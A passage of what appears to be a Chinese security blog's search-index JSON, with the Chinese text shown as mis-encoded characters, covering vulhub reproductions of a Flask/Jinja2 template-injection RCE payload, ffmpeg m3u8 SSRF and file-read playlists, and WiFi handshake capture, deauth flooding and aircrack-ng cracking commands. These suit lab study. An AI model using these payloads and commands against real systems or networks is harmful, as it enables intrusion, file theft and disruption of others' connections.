","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["æ¼æ´å¤ç°"],"content":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å¤ç°","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","tags":["Flask","æ¼æ´å¤ç°","vulhub"],"title":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Flaskï¼ˆJinja2ï¼‰ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["Flask","æ¼æ´å¤ç°","vulhub"],"title":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"åŸç† ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["Flask","æ¼æ´å¤ç°","vulhub"],"title":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å‚è€ƒæ–‡ç«  https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:1","tags":["Flask","æ¼æ´å¤ç°","vulhub"],"title":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° è®¿é—®http://your-ip/?name={{233*233}}ï¼Œå¾—åˆ°54289ï¼Œè¯´æ˜SSTIæ¼æ´å­˜åœ¨ã€‚ è·å– eval å‡½æ•°å¹¶æ‰§è¡Œä»»æ„ python ä»£ç çš„ POCï¼š {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} è®¿é—®http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7Dï¼Œå¾—åˆ°æ‰§è¡Œç»“æœï¼š ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["Flask","æ¼æ´å¤ç°","vulhub"],"title":"Flaskï¼ˆJinja2ï¼‰æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/","tags":["æ¼æ´å¤ç°","vulhub","ffmpeg"],"title":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´ ï¼ˆCVE-2016-1897/CVE-2016-1898ï¼‰ åœ¨FFMpeg2.X ç”±äºåœ¨è§£æHTTP Live Streamingæµåª’ä½“m3u8æ–‡ä»¶å¤„ç†ä¸å½“ï¼Œå¯å¯¼è‡´SSRFæ¼æ´ä¸ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚å½“ç½‘ç«™å…è®¸ç”¨æˆ·ä¸Šä¼ å¤šåª’ä½“æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨FFMpegè¿›è¡Œå¤„ç†æ—¶ä¼šè§¦å‘è¯¥æ¼æ´ã€‚ è¿™ä¸ªæ¼æ´æœ‰ä¸¤ä¸ªCVEç¼–å·ï¼Œåˆ†åˆ«æ˜¯CVE-2016-1897å’ŒCVE-2016-1898ï¼Œå®ƒä»¬ä¸¤ä¸ªçš„åŒºåˆ«åœ¨äºè¯»å–æ–‡ä»¶çš„è¡Œæ•°ï¼ŒCVE-2016-1897åªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œè€ŒCVE-2016-1898å¯ä»¥è¯»å–æ–‡ä»¶ä»»æ„è¡Œï¼ŒåŸç†åŸºæœ¬ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸€èµ·åˆ†æäº†ã€‚ ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¼æ´å¤ç°","vulhub","ffmpeg"],"title":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"HLSï¼ˆHTTP Live Streamingï¼‰ ç”±äºæ¼æ´æ˜¯å‡ºç°åœ¨è§£æHLSæµåª’ä½“æ–‡ä»¶å‡ºçš„é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å…ˆäº†è§£HLSã€‚ HLSï¼ˆHTTP Live Streamingï¼‰æ˜¯Appleå…¬å¸å¼€å‘çš„ä¸€ç§åŸºäºHTTPåè®®çš„æµåª’ä½“é€šä¿¡åè®®ï¼Œå¤§å¤šæ•°éƒ½åº”ç”¨åœ¨PCä¸Šå’Œiphoneä¸Šã€‚å®ƒçš„åŸºæœ¬åŸç†æ˜¯æŠŠä¸€ä¸ªè§†é¢‘æµåˆ†æˆå¾ˆå¤šä¸ªå¾ˆå°å¾ˆå°å¾ˆå°çš„tsæµæ–‡ä»¶ï¼Œç„¶åé€šè¿‡HTTPä¸‹è½½ï¼Œæ¯æ¬¡ä¸‹è½½ä¸€ç‚¹ç‚¹ã€‚åœ¨ä¸€ä¸ªå¼€å§‹ä¸€ä¸ªæ–°çš„æµåª’ä½“ä¼šè¯æ—¶ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šå…ˆä¸‹è½½ä¸€ä¸ªm3u8ï¼ˆæ’­æ”¾åˆ—è¡¨ Playlistï¼‰æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†è¿™æ¬¡HLSä¼šè¯çš„æ‰€æœ‰æ•°æ®ã€‚ http://pl.youku.com/playlist/m3u8?vid=340270152\u0026type=3gphd\u0026ts=1462714824\u0026keyframe=0\u0026ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2\u0026sid=746271452251312590fab\u0026token=3319\u0026ctype=12\u0026ev=1\u0026oip=3395898128 è¿™æ˜¯youkuä¸€ä¸ªè§†é¢‘çš„m3u8æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š #EXTM3U #EXT-X-TARGETDURATION:6 #EXT-X-VERSION:2 #EXTINF:6, http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0\u0026ts_end=5.9\u0026ts_seg_no=0\u0026ts_keyframe=1 #EXTINF:0, http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9\u0026ts_end=6.367\u0026ts_seg_no=1\u0026ts_keyframe=1 #EXT-X-ENDLIST è§£æï¼š #EXTM3U æ ‡ç­¾æ˜¯m3u8çš„æ–‡ä»¶å¤´ï¼Œå¼€å¤´å¿…é¡»è¦è¿™ä¸€è¡Œ #EXT-X-TARGETDURATION è¡¨ç¤ºæ•´ä¸ªåª’ä½“çš„é•¿åº¦ è¿™é‡Œæ˜¯6ç§’ #EXT-X-VERSION:2 è¯¥æ ‡ç­¾å¯æœ‰å¯æ—  #EXTINF:6, è¡¨ç¤ºè¯¥ä¸€æ®µTSæµæ–‡ä»¶çš„é•¿åº¦ #EXT-X-ENDLIST è¿™ä¸ªç›¸å½“äºæ–‡ä»¶ç»“æŸç¬¦ è¿™äº›æ˜¯m3u8çš„æœ€åŸºæœ¬çš„æ ‡ç­¾ï¼Œè€Œé—®é¢˜å°±å‡ºåœ¨FFMpegå»è¯·æ±‚TSæµæ–‡ä»¶çš„æ—¶ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªm3u8æ–‡ä»¶ï¼ŒFFMpegä¸ä¼šåˆ¤æ–­é‡Œé¢çš„æµåœ°å€ï¼Œç›´æ¥è¯·æ±‚ã€‚ ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¼æ´å¤ç°","vulhub","ffmpeg"],"title":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°","vulhub"],"content":"æ¼æ´åŸç† SSRFæ¼æ´ï¼š ç›´æ¥ç”¨FFMpegè§£æä¸€ä¸ªå¤šåª’ä½“æ–‡ä»¶ #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0,http://192.168.123.100:8080/1.html #EXT-X-ENDLIST ï¼ˆ#EXT-X-MEDIA-SEQUENCEæˆ–#EXT-X-TARGETDURATIONå¿…é¡»å­˜åœ¨ä»»æ„ä¸€ä¸ªï¼Œå‰è€…æ˜¯å®šä¹‰tsæµæ–‡ä»¶çš„åºå·ã€‚å»æ‰ä¼šæŠ¥é”™ï¼šæ— æ•ˆæ–‡ä»¶ï¼‰ ffmpeg -i test.m3u8 test.mp4ï¼ˆä¹Ÿå¯æŠŠm3u8æ ¼å¼æ”¹æˆå…¶ä»–åç¼€ï¼Œffmpegä¼šè‡ªåŠ¨è¯†åˆ«ä¸ºHLSæµæ–‡ä»¶ï¼‰ ä»¥ä¸‹å‡ ä¸ªæ–¹å¼å¯ä»¥è¯»å–æ–‡ä»¶: #EXTM3U #EXT-X-TARGETDURATION:1 #EXTINF:1, /home/ctf/flag.txt #EXT-X-ENDLIST #EXTM3U #EXT-X-PLAYLIST-TYPE:VOD #EXT-X-TARGETDURATION:1 #EXT-X-VERSION:3 #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, file:///home/ctf/flag.txt #EXT-X-ENDLIST ","date":"2019-02-15","objectID":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¼æ´å¤ç°","vulhub","ffmpeg"],"title":"ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´/SSRFæ¼æ´","uri":"/2019/02/ffmpeg-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Essrf%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"WIFI å®‰å…¨ç›¸å…³æ•´ç†","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"WIFI å¯†ç ç ´è§£ ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:0:0","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 åŸç† é€šè¿‡å‘é€æ–­å¼€è¿æ¥çš„è¯·æ±‚ï¼Œä½¿å¾—æ‰€æœ‰è¿æ¥äº†ç›®æ ‡ WIFI çš„è®¾å¤‡å…¨éƒ½æ–­å¼€è¿æ¥ï¼Œè®¾å¤‡ä¼šé‡æ–°è¿æ¥ï¼Œç„¶åç›‘å¬å…¶ä¸­ä¸€ä¸ªè®¾å¤‡ä¸ WIFI å»ºç«‹è¿æ¥æ—¶çš„æ¡æ‰‹åŒ…ï¼Œå…¶ä¸­åŒ…å«äº†å¯†ç çš„å¯†æ–‡ï¼Œç„¶åä½¿ç”¨ aircrack-ng è¿›è¡Œç¦»çº¿ç ´è§£ã€‚ ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:1:0","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 æ­¥éª¤ ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:0","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 æ‰«æé™„è¿‘ SSID æ‰§è¡Œå‘½ä»¤è·å–é™„è¿‘ SSID sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s è®¾ç½®å¿«æ·é”®åå˜æˆï¼š airport -s ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:1","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 æŠ“æ¡æ‰‹åŒ… ä¿¡æ¯ mac ä¸‹éœ€è¦å…ˆå®‰è£… aircrack-ng brew install aircrack-ng airport en0 sniff ä¿¡é“ ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼ŒCTRL+C ç»“æŸç›‘å¬ æ£€æµ‹è¿™ä¸ªåŒ…é‡Œæ˜¯å¦æŠ“åˆ°é‡Œæ¡æ‰‹åŒ…ï¼ˆæ˜¯å¦åŒ…å«å¯†ç ä¿¡æ¯ï¼‰ï¼š sudo aircrack-ng /tmp/airportSniffTRT4xj.cap æ³¨ï¼šå› ä¸ºåŒä¸€ä¸ªä¿¡é“å¯èƒ½å¹¶ä¸æ­¢ä¸€ä¸ª WIFI ä¿¡å·åœ¨ä½¿ç”¨ï¼Œæ‰€ä»¥ä¼šæ¢æµ‹å¤šä¸ª WIFI ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:2","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 DeAuth æ³›æ´ªæ”»å‡» sudo aireplay-ng -0 0 -a WIFIç‰©ç†åœ°å€ -c ç”¨æˆ·è®¾å¤‡ç‰©ç†åœ°å€ wlan0mon å‚æ•° -0 3 è¡¨ç¤ºå‘é€3æ¬¡ï¼Œ-0 0 è¡¨ç¤ºæŒç»­å‘é€ã€‚ ä¸åŠ  -c å‚æ•°è¡¨ç¤ºæ–­å¼€æ‰€æœ‰å®¢æˆ·ç«¯çš„è¿æ¥ ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:3","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 ç ´è§£æ¡æ‰‹å¯†ç åŒ… sudo aircrack-ng /tmp/airportSniffTRT4xj.cap -w å­—å…¸è·¯å¾„ ","date":"2019-02-01","objectID":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/:2:4","tags":["æ¸—é€æµ‹è¯•","WIFI"],"title":"WIFI å¯†ç ç ´è§£","uri":"/2019/02/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]